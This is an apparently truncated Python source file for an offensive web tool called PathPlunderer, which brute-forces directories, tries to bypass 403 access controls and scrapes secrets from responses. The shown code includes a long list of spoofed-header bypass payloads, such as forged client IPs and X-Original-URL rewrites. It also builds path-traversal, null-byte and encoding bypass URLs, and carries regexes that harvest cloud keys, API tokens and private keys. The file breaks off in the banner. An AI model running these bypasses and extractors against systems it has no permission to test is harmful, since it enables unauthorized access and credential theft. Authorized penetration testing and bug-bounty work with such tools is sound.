#!/usr/bin/env python3
"""
PathPlunderer v4.1 - Web Directory & File Brute Forcer + 403 Bypass + Secret Extractor
                     Subdomain / VHost / Fuzz / Cloud / Xmlrpc
by VICTOR AZARIAH
"""

from colorama import Fore, Back, Style, init
init(autoreset=True)

import os, sys, time, logging, requests, argparse, functools, re, json, ssl
import socket, urllib3, threading, hashlib, signal, textwrap, platform
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import urlparse, urljoin, urlencode, quote
from requests.utils import default_user_agent
from pathlib import Path
import urllib.request
from requests.auth import HTTPBasicAuth
from random import choice, shuffle, randint
from string import ascii_letters
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
try:
    from tqdm import tqdm
except ImportError:
    class tqdm:
        def __init__(self, total=0, desc="", leave=True, **kw):
            self.total = total; self.n = 0; self._desc = desc
        def update(self, n=1): self.n += n
        def close(self): pass
        def __enter__(self): return self
        def __exit__(self, *a): pass
        @staticmethod
        def write(msg, end="\n"): print(msg, end=end)

# Optional dnspython for advanced DNS features
try:
    import dns.resolver
    import dns.exception
    HAS_DNSPY = True
except ImportError:
    HAS_DNSPY = False

from typing import Optional, List, Dict, Tuple, Set
from dataclasses import dataclass, field
from datetime import datetime, timezone
import difflib

# ─────────────────────────────────────────────────────────────────────────────
#  CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────
VERSION = "4.1"
IS_WINDOWS = platform.system() == "Windows"

DEFAULT_STATUS_CODES = [200, 204, 301, 302, 307, 401, 403]

# Directories skipped by smart-recursion (static/asset dirs, not sensitive)
SMART_SKIP_DIRS: set = {
    # Images / photos
    "images", "img", "imgs", "image", "photos", "photo", "pictures", "pics",
    "gallery", "galleries", "thumbnails", "thumb", "thumbs", "avatars", "avatar",
    "screenshot", "screenshots", "banner", "banners",
    # CSS / fonts / icons
    "css", "styles", "style", "fonts", "font", "icons", "icon", "sprites",
    "gfx", "graphics", "svg", "webp", "favicon",
    # Image file extensions mistakenly used as dirs
    "gif", "jpg", "jpeg", "png", "webp",
    # Media / audio / video
    "video", "videos", "audio", "sounds", "media", "mp3", "mp4",
    # Font file extensions
    "woff", "woff2", "eot", "ttf", "otf",
    # Static build output (no sensitive content)
    "static", "assets", "asset", "dist", "build", "public",
    "vendor", "vendors", "lib", "libs",
    # i18n / locale strings
    "locale", "locales", "i18n", "lang", "languages",
    # Minified bundles
    "min", "bundle", "bundles",
    # Generic resource dirs
    "res", "resources",
}
DEFAULT_BLACKLIST    = [404]
ALL_METHODS          = ["GET", "POST", "HEAD", "PUT", "OPTIONS", "PATCH", "TRACE", "DEBUG"]
DEFAULT_TIMEOUT      = 10
DEFAULT_THREADS      = 50
DEFAULT_DEPTH        = 4
DEFAULT_RETRY        = 1
DEFAULT_RATE_LIMIT   = 0
DEFAULT_RESP_LIMIT   = 1_048_576

AUTOTHROTTLE_WARMUP   = 200
AUTOTHROTTLE_WINDOW   = 100
AUTOTHROTTLE_THRESH   = 0.80
AUTOTHROTTLE_COOLDOWN = 30.0
AUTOTHROTTLE_STEP     = 0.5
AUTOTHROTTLE_MIN      = 10

BACKUP_EXTS = ["~", ".bak", ".bak2", ".old", ".1", ".orig", ".tmp", ".swp", ".save"]

# Crawl-worthy content types
CRAWLABLE_CONTENT_TYPES = (
    "text/html", "application/xhtml", "text/xml", "application/xml",
    "application/javascript", "text/javascript", "application/json",
)

# Extensions that can be parsed/traversed for more links
CRAWL_PARSE_EXTS: frozenset = frozenset({
    ".html", ".htm", ".xhtml", ".shtml",
    ".js", ".mjs", ".jsx", ".ts", ".tsx",
    ".json", ".jsonc", ".json5",
    ".xml", ".rss", ".atom",
    ".txt", ".md",
    ".yml", ".yaml", ".toml", ".ini", ".cfg", ".conf", ".config",
    ".env", ".properties",
    "",          # no extension — could be anything (PHP, Python, Ruby, etc.)
})

# Extensions we report as findings but NEVER try to parse
# (valuable intel — backups, dumps, archives, docs, certs)
CRAWL_SENSITIVE_EXTS: frozenset = frozenset({
    # Archives / backups
    ".zip", ".tar", ".gz", ".bz2", ".xz", ".tgz", ".tar.gz",
    ".rar", ".7z", ".cab", ".iso",
    ".bak", ".bak2", ".backup", ".old", ".orig", ".save", ".swp", ".tmp",
    ".~", ".1", ".2",
    # Database dumps
    ".sql", ".dump", ".db", ".sqlite", ".sqlite3", ".mdb",
    # Documents / office files
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".odt", ".ods", ".odp", ".rtf",
    # Certificates / keys
    ".pem", ".key", ".crt", ".cer", ".pfx", ".p12", ".der", ".pub",
    # Log files
    ".log", ".logs", ".access", ".error",
    # Source maps (reveal original source)
    ".map",
    # Other potentially sensitive
    ".csv", ".tsv",
    ".jar", ".war", ".ear",
    ".apk", ".ipa",
})

# Pure noise — silently drop these from the crawl queue entirely
# (images, media, fonts, stylesheets — zero attack surface)
CRAWL_JUNK_EXTS: frozenset = frozenset({
    ".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".ico", ".bmp",
    ".tiff", ".tif", ".avif", ".heic", ".raw",
    ".css", ".less", ".scss", ".sass",
    ".woff", ".woff2", ".ttf", ".eot", ".otf",
    ".mp4", ".mp3", ".avi", ".mov", ".mkv", ".webm", ".ogg", ".wav",
    ".flac", ".aac", ".m4a", ".m4v",
    ".swf", ".fla",
})

# ─────────────────────────────────────────────────────────────────────────────
#  COLORS / STYLE HELPERS
# ─────────────────────────────────────────────────────────────────────────────
BOLD  = "\033[1m"
DIM   = "\033[2m"
RESET = "\033[0m"
CYAN  = Fore.CYAN
GREEN = Fore.GREEN
RED   = Fore.RED
YELLOW= Fore.YELLOW
BLUE  = Fore.BLUE
MAGENTA = Fore.MAGENTA
WHITE = Fore.WHITE

def c(text, color, bold=False):
    prefix = (Style.BRIGHT if bold else "") + color
    return prefix + str(text) + Style.RESET_ALL

def banner_line(char="─", width=80, color=Fore.CYAN):
    return color + (char * width) + Style.RESET_ALL

# ─────────────────────────────────────────────────────────────────────────────
#  SENSITIVE KEYWORDS
# ─────────────────────────────────────────────────────────────────────────────
SENSITIVE_KEYWORDS = [
    "password", "passwd", "secret", "token", "apikey", "api_key", "api-key",
    "auth", "credential", "cred", "private", "key", "oauth", "jwt", "bearer",
    ".env", "config", "conf", "setting", "setup", "init", "bootstrap",
    "application.properties", "application.yml", "application.yaml",
    "web.config", "server.xml", "nginx.conf", "httpd.conf", "wp-config",
    ".git", ".svn", ".hg", ".gitignore", ".gitlab-ci", "dockerfile",
    "docker-compose", "jenkinsfile", ".travis", "circleci", ".github",
    ".bak", ".backup", ".old", ".orig", ".copy", ".dump", ".sql",
    ".tar", ".gz", ".zip", ".rar", ".7z", "backup", "archive",
    ".aws", "credentials", "boto", "s3cfg", "gcloud", "kubeconfig",
    "terraform", ".tfstate", "ansible", "vault",
    "database", "db", "mysql", "mongo", "redis", "elastic", "postgres",
    "sqlite", "schema", "migration", "seed",
    "admin", "administrator", "superuser", "debug", "test", "dev",
    "phpinfo", "info.php", "shell", "cmd", "exec", "eval",
    "log", "logs", "error", "access", "audit", "trace",
    "swagger", "openapi", "graphql", "api-docs", "apidocs", "wsdl",
    ".pem", ".key", ".crt", ".cer", ".p12", ".pfx", "id_rsa", "id_dsa",
    "robots.txt", "sitemap", "crossdomain.xml", "security.txt",
    "phpunit", "composer.json", "package.json", "requirements.txt",
    "procfile", "gemfile", ".npmrc", ".yarnrc", ".env.local",
]

SENSITIVE_PATH_COMPONENTS = [
    'admin', 'login', 'config', 'backup', 'db', '.git', '.env', 'wp-admin',
    'auth', 'token', 'user', 'database', 'secret', 'private', 'internal',
    'debug', 'test', 'staging', 'dev', 'phpinfo', 'shell', 'cmd',
]

def looks_sensitive(url: str) -> tuple:
    """Check if a URL looks sensitive - checks only path+query, NOT the domain."""
    try:
        parsed = urlparse(url if url.startswith("http") else ("http://" + url))
        path_and_query = (parsed.path + "?" + parsed.query if parsed.query else parsed.path).lower()
    except Exception:
        path_and_query = url.lower()
    for kw in SENSITIVE_KEYWORDS:
        if kw in path_and_query:
            return True, f"keyword:{kw}"
    for comp in [c for c in path_and_query.split("/") if c]:
        comp_clean = comp.split("?")[0]
        for sk in SENSITIVE_PATH_COMPONENTS:
            if sk in comp_clean:
                return True, f"path:{sk}"
    return False, ""

# ─────────────────────────────────────────────────────────────────────────────
#  USER AGENTS
# ─────────────────────────────────────────────────────────────────────────────
USER_AGENT_LIST = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "curl/8.4.0",
    "Wget/1.21.4 (linux-gnu)",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Apache-HttpClient/4.5.13 (Java/17)",
)

# ─────────────────────────────────────────────────────────────────────────────
#  SECRET PATTERNS
# ─────────────────────────────────────────────────────────────────────────────
SECRET_PATTERNS: Dict[str, str] = {
    "AWS Access Key":       r"(?<![A-Z0-9])(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}(?![A-Z0-9])",
    "AWS Secret Key":       r"(?i)aws[_\-\s\.]{0,4}secret[_\-\s\.]{0,4}(?:access[_\-\s\.]{0,4})?key[_\-\s\.\"':=]{0,5}([A-Za-z0-9/+=]{40})",
    "AWS Session Token":    r"(?i)(?:aws[_\-\s\.]{0,4})?session[_\-\s\.]{0,4}token[_\-\s\.\"':=]{0,5}([A-Za-z0-9/+=]{200,})",
    "GCP API Key":          r"AIza[0-9A-Za-z\-_]{35}",
    "GCP Service Account":  r'"type":\s*"service_account"',
    "Azure Storage Key":    r"(?i)(?:DefaultEndpointsProtocol|AccountKey)[^\n]{0,200}",
    "Azure SAS Token":      r"(?i)sig=[A-Za-z0-9%/+]{43,}={0,2}",
    "GitHub Token":         r"(?:ghp|gho|ghu|ghs|ghr|github_pat)_[A-Za-z0-9_]{36,}",
    "GitLab Token":         r"glpat-[A-Za-z0-9\-]{20}",
    "Slack Token":          r"xox[baprs]-[0-9A-Za-z\-]{10,48}",
    "Slack Webhook":        r"https://hooks\.slack\.com/services/T[A-Z0-9]{8}/B[A-Z0-9]{8}/[A-Za-z0-9]{24}",
    "Stripe API Key":       r"(?:sk|pk)_(?:test|live)_[0-9a-zA-Z]{24,}",
    "SendGrid API Key":     r"SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}",
    "Twilio SID":           r"AC[a-z0-9]{32}",
    "Twilio Auth Token":    r"(?i)twilio[^\n]{0,30}[0-9a-f]{32}",
    "Mailchimp API Key":    r"[0-9a-f]{32}-us[0-9]{1,2}",
    "NPM Token":            r"(?:npm_)[A-Za-z0-9]{36}",
    "PyPI Token":           r"pypi-[A-Za-z0-9\-_]{40,}",
    "Heroku API Key":       r"(?i)heroku[^\n]{0,20}[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
    "JWT Token":            r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}",
    "RSA Private Key":      r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
    "PGP Private Key":      r"-----BEGIN PGP PRIVATE KEY BLOCK-----",
    "Generic Password":     r'(?i)(?:password|passwd|pwd|secret|pass)[_\-\s\.\"\'`:=]{1,5}([^\s"\'<>{}\[\]]{8,64})',
    "Generic API Key":      r'(?i)(?:api[_\-]?key|apikey|access[_\-]?key|auth[_\-]?token)[_\-\s\.\"\'`:=]{1,5}([A-Za-z0-9\-_\.]{16,64})',
    "MongoDB URI":          r"mongodb(?:\+srv)?://[^\s\"'<>]{10,}",
    "PostgreSQL URI":       r"postgres(?:ql)?://[^\s\"'<>]{10,}",
    "MySQL URI":            r"mysql://[^\s\"'<>]{10,}",
    "Redis URI":            r"redis://[^\s\"'<>]{10,}",
    "Firebase URL":         r"https://[a-z0-9\-]+\.firebaseio\.com",
    "Firebase Config":      r'"apiKey":\s*"[A-Za-z0-9_\-]{30,50}"',
    "Cloudflare API Token": r"(?i)cloudflare[^\n]{0,20}[A-Za-z0-9_\-]{37}",
    "DigitalOcean Token":   r"dop_v1_[a-f0-9]{64}",
    "Email Address":        r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}",
    "Basic Auth in URL":    r"https?://[^:@\s]+:[^:@\s]+@[^\s]+",
    "IP Address (Internal)":r"\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b",
    "Google OAuth":         r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com",
    "Telegram Bot Token":   r"[0-9]{8,10}:[A-Za-z0-9_\-]{35}",
    "Discord Token":        r"(?:mfa\.[A-Za-z0-9\-_]{84}|[A-Za-z0-9]{24}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27})",
    "Shopify Token":        r"shpat_[A-Za-z0-9]{32}|shpss_[A-Za-z0-9]{32}|shpca_[A-Za-z0-9]{32}",
    "Datadog API Key":      r"(?i)datadog[^\n]{0,20}[a-f0-9]{32}",
    "Square Access Token":  r"sq0atp-[A-Za-z0-9\-_]{22}|sq0csp-[A-Za-z0-9\-_]{43}",
    "Artifactory Token":    r"(?i)artifactory[^\n]{0,20}[A-Za-z0-9]{73}",
}

# ─────────────────────────────────────────────────────────────────────────────
#  SCHEME DETECTION
# ─────────────────────────────────────────────────────────────────────────────
def _detect_scheme(host: str) -> str:
    import ssl as _ssl, socket as _socket
    host = host.rstrip("/")
    netloc  = host.split("/")[0]
    hostname, _, port_str = netloc.partition(":")
    https_port = int(port_str) if port_str else 443
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = _ssl.CERT_NONE
        with _socket.create_connection((hostname, https_port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname): pass
        tqdm.write(Fore.GREEN + f"  [SCHEME] TLS handshake OK on {hostname}:{https_port} → https://" + Fore.RESET)
        return f"https://{host}"
    except Exception: pass
    http_port = int(port_str) if port_str else 80
    try:
        with _socket.create_connection((hostname, http_port), timeout=5) as sock:
            sock.sendall(f"HEAD / HTTP/1.0\r\nHost: {hostname}\r\n\r\n".encode())
            banner = sock.recv(16)
        if banner.startswith(b"HTTP"):
            tqdm.write(Fore.YELLOW + f"  [SCHEME] HTTP on {hostname}:{http_port}, no TLS → http://" + Fore.RESET)
            return f"http://{host}"
    except Exception: pass
    tqdm.write(Fore.YELLOW + f"  [SCHEME] Could not probe {hostname} — defaulting to https://" + Fore.RESET)
    return f"https://{host}"

# ─────────────────────────────────────────────────────────────────────────────
#  403 BYPASS VARIATIONS  (extended with bug bounty tricks)
# ─────────────────────────────────────────────────────────────────────────────
BYPASS_HEADERS = [
    # IP spoofing headers
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-Forwarded-For": "10.0.0.1"},
    {"X-Forwarded-For": "192.168.0.1"},
    {"X-Forwarded-For": "172.16.0.1"},
    {"X-Forwarded-For": "127.0.0.1, 127.0.0.2"},
    {"X-Forwarded-For": "127.0.0.1:80"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Real-IP": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"X-Azure-ClientIP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    # URL rewrite / override headers
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Override-URL": "/"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Scheme": "https"},
    {"X-Forwarded-Proto": "https"},
    {"Forwarded": "for=127.0.0.1;proto=https;host=localhost"},
    # Method override
    {"X-HTTP-Method-Override": "GET"},
    {"X-Method-Override": "GET"},
    {"_method": "GET"},
    # Misc bypass headers
    {"Content-Length": "0"},
    {"Transfer-Encoding": "chunked"},
    # Proxy / CDN headers
    {"Via": "1.1 localhost"},
    {"Via": "1.0 internal-proxy"},
    {"X-WAP-Profile": "http://wap.samsungmobile.com/uaprof/SGH-I900.xml"},
    # Nginx / Apache specific
    {"X-Accel-Internal": "/internal/"},
    {"X-Accel-Redirect": "/"},
    {"X-Sendfile": "/dev/null"},
    # Cache bypass
    {"Cache-Control": "no-cache"},
    {"Pragma": "no-cache"},
    # Auth bypass
    {"Authorization": "null"},
    {"Authorization": "undefined"},
    {"Authorization": "Bearer null"},
    # Host manipulation
    {"Host": "localhost"},
    {"Host": "127.0.0.1"},
    # Content type tricks
    {"Content-Type": "application/json"},
    {"Accept": "application/json"},
    {"Accept": "*/*"},
    # Debug / staging headers
    {"X-Debug": "true"},
    {"X-Debug-Token": "1"},
    {"X-Internal-Request": "true"},
    {"X-Is-Internal": "true"},
    {"X-Backend-Server": "true"},
    {"X-Forwarded-For": "10.10.10.10, 192.168.1.1, 127.0.0.1"},
    # Cloudflare Workers bypass
    {"CF-Worker": "true"},
    {"CF-ipcountry": "US"},
    # Spring Boot Actuator
    {"X-Application-Context": "application"},
    # Varnish / Fastly
    {"Fastly-Client-IP": "127.0.0.1"},
    {"Fastly-FF": "true"},
    # Akamai
    {"Akamai-Origin-Hop": "1"},
    {"True-Client-Ip": "127.0.0.1"},
    # Azure
    {"X-Azure-FDID": "00000000-0000-0000-0000-000000000000"},
    {"X-FD-HealthProbe": "1"},
    # General bypass
    {"Upgrade-Insecure-Requests": "1"},
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-CSRF-Token": "null"},
    {"Origin": "null"},
    {"Origin": "https://localhost"},
    {"Referer": "https://localhost/admin"},
    {"Sec-Fetch-Site": "same-origin"},
    {"Sec-Fetch-Mode": "navigate"},
]

def generate_bypass_paths(base_url: str, path: str) -> List[Dict]:
    path = path.lstrip("/") if path else ""
    b = base_url.rstrip("/")
    p = path
    variants = []

    def add(url, headers=None, method="GET"):
        variants.append({"url": url, "headers": headers or {}, "method": method})

    if p:
        # Path traversal & encoding tricks
        add(f"{b}/{p}/*"); add(f"{b}/{p}/.")
        add(f"{b}/{p}/.."); add(f"{b}/{p}/./")
        add(f"{b}/{p}//"); add(f"{b}//{p}")
        add(f"{b}//{p}//"); add(f"{b}/./{p}/./")

        # Percent-encoding
        for enc in ["%20","%09","%00","%3F","%23","%2A","%3B","%3D",
                    "%26","%24","%40","%5E","%7C","%7E","%2e","%2e%2e",
                    "%2f","%252f","%255c","%5c"]:
            add(f"{b}/{p}{enc}")

        add(f"{b}/%2e/{p}"); add(f"{b}/%2f/{p}")
        add(f"{b}/%2e%2e/{p}"); add(f"{b}/{p}?")
        add(f"{b}/{p}#"); add(f"{b}/{p}/?anything")
        add(f"{b}/{p}#fragment"); add(f"{b}/{p}&")
        add(f"{b}/{p};"); add(f"{b}/{p}..;/")
        add(f"{b}/{p}/..;/"); add(f"{b}/{p}/;/")
        add(f"{b}/{p};/")

        # Double-slash + triple-slash
        add(f"{b}///{p}"); add(f"{b}/{p}///")

        # Unicode normalization / zero-width tricks
        add(f"{b}/{p}\u200b"); add(f"{b}/{p}\u00ad")  # zero-width / soft-hyphen

        # Null byte (useful against PHP path checks)
        add(f"{b}/{p}%00.html"); add(f"{b}/{p}%00.php")

        # Tab/newline injection
        add(f"{b}/{p}%09"); add(f"{b}/{p}%0a"); add(f"{b}/{p}%0d")

        # Case manipulation
        add(f"{b}/{p.upper()}"); add(f"{b}/{p.lower()}")
        mixed = "".join(ch.upper() if i%2==0 else ch.lower() for i,ch in enumerate(p))
        add(f"{b}/{mixed}")

        # Extensions
        for ext in [".html",".php",".json",".xml",".txt",".asp",".aspx",".jsp",".do",".action",".py",".rb",".cfm"]:
            add(f"{b}/{p}{ext}")
        for ext in BACKUP_EXTS:
            add(f"{b}/{p}{ext}")

        # Nginx off-by-slash trick
        if not p.endswith("/"):
            add(f"{b}/{p}/"); add(f"{b}/{p}./")

        # Spring Boot Actuator paths
        for sp in ["/actuator", "/actuator/health", "/actuator/info", "/actuator/env"]:
            add(f"{b}/{p}{sp}")

        # Common sub-paths
        for sub in ["/index","/login","/admin","/dashboard","/debug","/config","/setup","/api"]:
            add(f"{b}/{p}{sub}")

        # HTTP method override
        for m in ["POST","TRACE","DEBUG","OPTIONS","HEAD","PUT","PATCH","CONNECT"]:
            add(f"{b}/{p}", method=m)
        add(f"{b}/{p}", headers={"Content-Length":"0"}, method="POST")
        add(f"{b}/{p}", headers={"Content-Type":"application/x-www-form-urlencoded"}, method="POST")

        # Header-based bypasses (all BYPASS_HEADERS)
        for h in BYPASS_HEADERS:
            add(f"{b}/{p}", headers=h)

        # X-Original-URL / Rewrite tricks pointing to path
        for k in ["X-Original-URL","X-Rewrite-URL","X-Override-URL","X-Forwarded-Path"]:
            add(f"{b}/", headers={k: f"/{p}"})
            add(f"{b}/", headers={k: f"/{p}/"})

        # Path + IP spoofing combo
        for ip_header in ["X-Forwarded-For","X-Real-IP","True-Client-IP"]:
            for ip in ["127.0.0.1","::1","localhost","0.0.0.0"]:
                add(f"{b}/{p}", headers={ip_header: ip})

        # IIS-specific: semicolon trick
        if "/" in p:
            parts = p.split("/")
            add(f"{b}/{';'.join(parts)}")
            add(f"{b}/{parts[0]};.js/{'/'.join(parts[1:])}")

        # Apache Tomcat path param trick
        add(f"{b}/{p};jsessionid=abc123")
        add(f"{b}/{p};x=y")

        # PHP path info trick
        add(f"{b}/{p}/index.php/")
        add(f"{b}/{p}.php/")

        # Double URL encoding
        double = p.replace("/", "%252f").replace(".", "%252e")
        add(f"{b}/{double}")

        # Unicode lookalike bypass
        add(f"{b}/{p.replace('a', '\u0430').replace('e','\u0435')}")  # Cyrillic lookalikes

        # Referer / Origin tricks
        add(f"{b}/{p}", headers={"Referer": f"{b}/{p}"})
        add(f"{b}/{p}", headers={"Origin": b})
        add(f"{b}/{p}", headers={"Referer": b + "/"})

    else:
        for suffix in ["/*","/%2e/","/.","//","///"]:
            add(f"{b}{suffix}")
        for enc in ["%20","%09","%3F","%23","%2e","%2f"]:
            add(f"{b}/{enc}")
        add(f"{b}?"); add(f"{b}#"); add(f"{b}/~")
        for m in ["POST","TRACE","DEBUG","OPTIONS","HEAD"]:
            add(f"{b}/", method=m)
        for h in BYPASS_HEADERS:
            add(f"{b}/", headers=h)

    return variants

# ─────────────────────────────────────────────────────────────────────────────
#  RATE LIMITER
# ─────────────────────────────────────────────────────────────────────────────
class RateLimiter:
    def __init__(self, rate: float):
        self.rate = rate; self._lock = threading.Lock(); self._last = time.monotonic()
    def acquire(self):
        if self.rate <= 0: return
        interval = 1.0 / self.rate
        with self._lock:
            now = time.monotonic(); wait = self._last + interval - now
            if wait > 0: time.sleep(wait)
            self._last = time.monotonic()

# ─────────────────────────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def lister(exts):
    if isinstance(exts, str):
        exts = [i.strip() for i in exts.split(',')]
    elif exts is None:
        return ['']
    elif not isinstance(exts, list):
        raise ValueError(f"{exts} type {type(exts)} is not valid!")
    looks_like_codes = all(
        (isinstance(e, int) or (isinstance(e, str) and (e.isdigit() or '-' in e)))
        for e in exts if e != ''
    )
    if looks_like_codes and exts != ['']:
        expanded = []
        for item in exts:
            item = str(item).strip()
            if '-' in item and not item.startswith('-'):
                try:
                    start, end = map(int, item.split('-', 1))
                    expanded.extend(range(start, end + 1))
                except ValueError: pass
            else:
                try: expanded.append(int(item))
                except ValueError: pass
        expanded.sort(); return expanded
    else:
        if exts != ['']:
            exts = ['.' + i if i and not i.startswith('.') else i for i in exts]
            if '' not in exts: exts.insert(0, '')
            try: exts.remove('.')
            except ValueError: pass
        return exts

def colorize_status(code: int) -> str:
    if code < 300:   return Fore.GREEN  + str(code) + Fore.RESET
    elif code < 400: return Fore.BLUE   + str(code) + Fore.RESET
    elif code in (401, 403): return Fore.YELLOW + str(code) + Fore.RESET
    elif code == 404: return Fore.RED   + str(code) + Fore.RESET
    elif code >= 500: return Fore.MAGENTA + str(code) + Fore.RESET
    return str(code)

def page_hash(content: bytes) -> str:
    return hashlib.md5(content).hexdigest()

def similarity_ratio(a: bytes, b: bytes) -> float:
    return difflib.SequenceMatcher(None, a[:4096], b[:4096]).ratio()

def extract_secrets(url: str, body: str) -> List[Dict]:
    found = []
    for name, pattern in SECRET_PATTERNS.items():
        try:
            for match in re.finditer(pattern, body):
                value = match.group(0)
                if name == "Email Address" and ("example.com" in value or "test." in value):
                    continue
                found.append({"type": name, "value": value[:200], "url": url})
        except re.error: pass
    return found

def extract_links(base_url: str, body: str, same_origin_only: bool = True) -> List[str]:
    """Extract ALL URL-like values from HTML/JS body.

    Captures every HTML attribute that may contain a URL (href, src, action,
    data-url, data-href, srcset, poster, etc.) PLUS JS string literals,
    fetch/axios/require/import patterns, and CSS url() values.

    Extension-based filtering is done by the caller (_crawl_url):
      CRAWL_JUNK_EXTS       -> silently dropped  (images, fonts, CSS, media)
      CRAWL_SENSITIVE_EXTS  -> surfaced as finding, not parsed  (pdf, zip, sql)
      everything else       -> followed and parsed normally
    """
    links: set = set()
    parsed = urlparse(base_url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    def _add(href: str) -> None:
        if not href:
            return
        href = href.strip().split("?")[0].split("#")[0].strip()
        if not href:
            return
        if href.startswith(("mailto:", "tel:", "javascript:", "data:", "blob:", "void")):
            return
        if href.startswith("//"):
            links.add(f"{parsed.scheme}:{href}")
        elif href.startswith("http://") or href.startswith("https://"):
            if not same_origin_only or href.startswith(base):
                links.add(href)
        elif href.startswith("/"):
            links.add(base + href)
        elif href and not href.startswith(("#", " ", "{")):
            # relative path -- only add if it looks like a real path segment
            if re.match(r'^[a-zA-Z0-9_\-][a-zA-Z0-9_\-./]{1,150}$', href):
                links.add(base + "/" + href)

    # ── HTML attribute URLs ────────────────────────────────────────────────
    # Covers: href, src, action, data-*, srcset (first entry), poster, ping
    for m in re.finditer(
        r'\b(?:href|src|action|data-url|data-href|data-src|data-action|data-link|'
        r'poster|ping|formaction)\s*=\s*["\']([^"\'<>\s]{2,400})["\']',
        body, re.IGNORECASE
    ):
        _add(m.group(1))

    # srcset="img.png 1x, img2.png 2x" -- grab each entry
    for m in re.finditer(r'\bsrcset\s*=\s*["\']([^"\'<>]+)["\']', body, re.IGNORECASE):
        for entry in m.group(1).split(","):
            _add(entry.strip().split(" ")[0])

    # <meta http-equiv="refresh" content="0; url=...">
    for m in re.finditer(r'\burl\s*=\s*["\']?([^"\'<>\s;,]{4,300})', body, re.IGNORECASE):
        _add(m.group(1))

    # ── JS patterns ───────────────────────────────────────────────────────
    # fetch(), axios.get/post/..(), $.get/post(), XMLHttpRequest.open()
    for m in re.finditer(
        r'(?:fetch|axios\.(?:get|post|put|delete|patch|head)|'
        r'\$\.(?:get|post|ajax)|open)\s*\(\s*["\']([^"\'<>\s?#]{4,300})["\']',
        body
    ):
        _add(m.group(1))

    # url: '/path', url = '/path', path: '/path', endpoint: '/path'
    for m in re.finditer(
        r'(?:url|path|endpoint|href|src|action|route)\s*[:=]\s*["\']([^"\'<>\s?#]{4,300})["\']',
        body
    ):
        _add(m.group(1))

    # require('/path') / import ... from '/path'
    for m in re.finditer(
        r'(?:require\s*\(\s*|from\s+)["\']([^"\'<>\s?#]{4,300})["\']',
        body
    ):
        _add(m.group(1))

    # Any JS/JSON string literal that IS an absolute path starting with /
    for m in re.finditer(r'["\'](/[a-zA-Z0-9_\-./]{3,200})["\']', body):
        _add(m.group(1))

    return list(links)
def pretty_banner(no_color: bool = False) -> str:
    """Slick cyberpunk-style banner with gradient accent bar."""
    import shutil as _sh
    tw = _sh.get_terminal_size((100, 24)).columns

    # ── ASCII art (7-line block) ──────────────────────────────────────────
    ART = [
        r"    ____        __  __    ____  __               __                     ",
        r"   / __ \____ _/ /_/ /_  / __ \/ /_  ______  ___/ /___  ________  _____ ",
        r"  / /_/ / __ `/ __/ __ \/ /_/ / / / / / __ \/ __  / _ \/ ___/ _ \/ ___/ ",
        r" / ____/ /_/ / /_/ / / / ____/ / /_/ / / / / /_/ /  __/ /  /  __/ /     ",
